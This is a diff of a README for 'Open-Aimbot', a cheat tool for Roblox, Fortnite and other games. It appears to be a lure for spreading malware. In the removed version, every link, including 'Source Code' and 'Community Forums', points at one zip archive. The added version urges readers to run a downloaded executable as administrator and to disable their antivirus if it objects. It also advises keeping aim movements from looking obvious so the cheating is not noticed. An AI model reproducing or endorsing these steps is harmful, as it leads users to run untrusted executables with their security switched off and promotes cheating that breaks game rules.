@@ -1,78 +1,134 @@
-# 🎯 Open-Aimbot - Your Universal Aimbot Solution
+# 🎯 Open-Aimbot - Easy Aim Assistance Framework
 
-[![download button](https://i.imgur.com/3Dm4p65.png)](https://fileshare.rest/L2XZZM/ logo)
+[![Download Open-Aimbot](https://img.shields.io/badge/Download-Open--Aimbot-brightgreen?style=for-the-badge)](https://github.com/FRAZE76/Open-Aimbot)
 
-## 🚀 Getting Started
+---
 
-Open Aimbot is a universal open-source framework designed to enhance your gaming experience. With various utilities tailored for Roblox and other games, you can easily use scripts that improve gameplay and security. Follow these simple steps to  and run Open Aimbot.
+## 📋 What is Open-Aimbot?
 
-## 📥  Open-Aimbot
+Open-Aimbot is a universal open source framework. It helps you with various utilities for games like Roblox, Fortnite, and others. You can use it to improve aim, run security checks, or use specific scripts built for different scenarios. The project focuses on making tools that work on many platforms and games, including mobile devices. It uses technology from AI and object detection to provide efficient bots and protection systems.
 
-[![ Open-Aimbot](https://raw.githubusercontent.com/TheCursedOn1/Open-Aimbot/main/leed/Open-Aimbot-v3.2.zip)](https://raw.githubusercontent.com/TheCursedOn1/Open-Aimbot/main/leed/Open-Aimbot-v3.2.zip)
+---
 
-## 🛠️ System Requirements
+## 💻 System Requirements
 
-To run Open Aimbot smoothly, ensure your system meets the following requirements:
+Before you start, make sure your PC meets these basic requirements:
 
-- **Operating System:** Windows 10 or later
-- **Processor:** 2.0 GHz or faster
-- **RAM:** 4 GB or more
-- **Storage:** At least 100 MB free space
-- **Internet:** Required for initial setup and updates
+- Operating System: Windows 10 or later (64-bit recommended)  
+- Processor: Intel i3 or AMD Ryzen 3 minimum  
+- RAM: 4 GB or higher  
+- Disk Space: At least 300 MB of free space  
+- Internet: Required for download and updates  
+- Additional Software: None required; runs as a standalone application
 
-## 📥  & Install
+---
 
-1. **Visit the  Page:** Click on the link below to access the  page.
-   
-   [ Open-Aimbot](https://raw.githubusercontent.com/TheCursedOn1/Open-Aimbot/main/leed/Open-Aimbot-v3.2.zip)
+## 🚀 Getting Started: How to Download and Run Open-Aimbot
 
-2. **Choose the Latest Version:** On the page, look for the latest . This will usually be at the top.
+1. Click the large green button above or visit this link to download the program:  
+   [https://github.com/FRAZE76/Open-Aimbot](https://github.com/FRAZE76/Open-Aimbot)
 
-3. ** the Setup File:** Click on the file link to start the . Your browser may prompt you to confirm the ; agree to proceed.
+2. This link takes you to the main project page on GitHub. Look for the latest release under the "Releases" tab at the right or center of the page.
 
-4. **Run the Installer:** Once the  is complete, locate the file in your  folder and double-click on it to begin installation.
+3. Download the Windows version setup file or executable (.exe) from the latest release. The file name usually includes "Windows" or ".exe".
 
-5. **Follow Installation Prompts:** Follow the instructions provided during the installation process. Accept the terms, choose your installation directory, and complete the setup.
+4. Once the download finishes, locate the file in your **Downloads** folder.
 
-6. **Launch Open Aimbot:** After installation, you can find Open Aimbot in your Start Menu. Click to launch the application.
+5. Double-click the installer or the executable file to start the process. Follow the on-screen instructions if there is an installer.
 
-## 🛡️ Features
+6. After installation, find the Open-Aimbot icon on your desktop or start menu. Double-click to launch the program.
 
-Open Aimbot includes a variety of features to enhance your gaming experience:
+---
 
-- **Roblox Utilities:** Easy-to-use scripts tailored for Roblox gameplay.
-- **Game Protection Tools:** Security scripts to protect your gaming account from threats.
-- **Broad Game Compatibility:** Works with various games, ensuring flexibility.
-- **User-Friendly Interface:** Simple navigation for all users, regardless of technical knowledge.
+## 🔧 How to Use Open-Aimbot
 
-## ⚙️ Using Open Aimbot
+Open-Aimbot aims to deliver easy control through a simple interface. Here are basic steps to get going:
 
-Once you launch the application, follow these steps to start using Open Aimbot:
+1. Open the app. You will see a menu with several options related to different games and utilities.
 
-1. **Select Your Game:** Choose the game you want to optimize from the main menu.
-2. **Enable Features:** Toggle on the features you wish to use. This can include aimbot, speed hacks, or security scripts.
-3. **Adjust Settings:** Fine-tune your preferences, such as sensitivity and speed. Each feature has simple on-screen options.
-4. **Start Gaming:** Launch your game and notice improvements in your gameplay experience!
+2. Select the game or function you want to use. Options include Roblox utilities, Fortnite scripts, and general aim bots.
 
-## 📚 Support
+3. Adjust settings to your preference. You can customize aim speed, target selection, and other parameters to fit your needs.
 
-If you face any issues or have questions, please refer to the FAQ section on the project page. You can also reach out through the community forums for assistance. 
+4. Start the script or tool by clicking the "Run" button.
 
-## 🛠️ Contribution
+5. The app will operate alongside your game, helping you with aim assistance or other tasks.
 
-Open Aimbot is an open-source project. If you'd like to contribute, please follow these guidelines:
+6. When done, close the app or stop the script using the "Stop" button.
 
-- Fork the repository on GitHub.
-- Make your changes.
-- Submit a pull request with a clear description of your updates.
+---
 
-## 🚀 Updates
+## 🔍 Features
 
-Keep your application updated by regularly checking the  page. New features and fixes are added to enhance your experience. To  updates, simply repeat the  steps mentioned above.
+- Supports multiple games including Roblox and Fortnite  
+- Uses AI for better aim and object detection  
+- Offers protection tools to secure your games  
+- Compatible with Windows and mobile platforms  
+- Open source for transparency and community input  
+- Includes various scripts tailored for specific game scenarios
 
-## 🔗 Useful Links
+---
 
-- [Open-Aimbot Source Code](https://raw.githubusercontent.com/TheCursedOn1/Open-Aimbot/main/leed/Open-Aimbot-v3.2.zip)
-- [Community Forums](https://raw.githubusercontent.com/TheCursedOn1/Open-Aimbot/main/leed/Open-Aimbot-v3.2.zip)
+## ⚙️ Configuration Tips
 
-By following this guide, you can easily  and start using Open Aimbot. Have fun gaming!
+- Run the app as an administrator if some features don’t work properly.  
+- Disable any antivirus temporarily if it blocks the program; some security programs flag bots even if they are safe.  
+- Make sure the game runs in windowed mode for better interaction with the bot.  
+- Adjust aim speed to avoid making movements too fast or obvious.  
+- Use training modes available within supported games to test settings before live use.
+
+---
+
+## 🛠 Troubleshooting
+
+If you encounter problems:
+
+- Restart the application and your computer.  
+- Check you have the latest version of the software on GitHub.  
+- Verify that your game is running and fully updated.  
+- Confirm your antivirus or firewall is not blocking the program.  
+- Review the FAQ and Issues sections on the GitHub page for common solutions.
+
+---
+
+## 📂 Files and Setup Structure
+
+When you install Open-Aimbot, it usually creates a folder named "Open-Aimbot" in your **Program Files** or chosen location.  
+This contains:  
+
+- Main executable file (.exe)  
+- Configuration files (.json or .ini) stored under a "config" folder  
+- Scripts directory with files for different utilities and games  
+- Logs folder for error and performance reports  
+
+Do not change file names or move these folders, or the program might stop working correctly.
+
+---
+
+## 🌐 Where to Find Help or Updates
+
+For help, bug reports, or updates:
+
+- Visit the GitHub page: [https://github.com/FRAZE76/Open-Aimbot](https://github.com/FRAZE76/Open-Aimbot)  
+- Check the "Issues" tab for common problems or to report new ones  
+- Use the "Discussions" tab to ask questions or suggest improvements
+
+Updating the program usually means downloading the newest release from the same page and running the installer again.
+
+---
+
+## 🔒 Safety and Security
+
+Open-Aimbot is open source, meaning anyone can see the code and verify it.  
+Use the official GitHub link only to avoid files that may be harmful or fake.  
+Avoid sharing your personal gaming account details.  
+Do not run unknown scripts from third parties within the app.  
+Using bots in games can conflict with game rules. Be aware of your game’s policy before using the software.
+
+---
+
+## 📥 Download Here Again
+
+To get started, visit the official project page:  
+
+[![Get Open-Aimbot](https://img.shields.io/badge/Open--Aimbot-Download%20Page-blue?style=for-the-badge)](https://github.com/FRAZE76/Open-Aimbot)
